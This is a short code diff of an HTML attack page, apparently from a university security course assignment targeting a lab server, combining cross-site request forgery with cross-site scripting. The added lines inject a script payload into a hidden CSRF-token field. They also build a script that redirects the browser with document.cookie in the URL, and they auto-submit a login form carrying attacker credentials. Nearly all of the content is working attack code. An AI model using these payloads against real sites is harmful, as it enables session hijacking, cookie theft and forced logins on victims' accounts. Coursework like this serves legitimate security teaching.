@@ -4,7 +4,7 @@
 <form name="loginForm" id="login" action="http://trurl.cs.illinois.edu/login?csrfdefense=1&xssdefense=0" method="post" target='csrf-frame'>
     <input type='hidden' name="username" value="attacker">
     <input type='hidden' name="password" value="l33th4x">
-    <input type='hidden' id = 'csrf_token' name='csrf_token' value=''>
+    <input type='hidden' id = 'csrf_token' name='csrf_token' value='<script>alert(document.cookie)</script>'>
 </form>
 
 <form name="search" id="search" action="http://trurl.cs.illinois.edu/" method="post">
@@ -34,11 +34,11 @@
 
 	var myform = document.getElementById('login');
 	var searchform = document.getElementById('search')
-
+	document.getElementById('xss').value = document.currentScript + '?cookie=\'\>\<script\> window.location=\"/?cookie=\"+document.cookie\</script\>'
 	// myform.submit();
 	// cookie = getCookie('csrf_token');
 	// document.getElementById('csrf_token').value = cookie;
 	// myform.submit();
-	searchform.submit();
+	myform.submit();
 </script>
 </html>
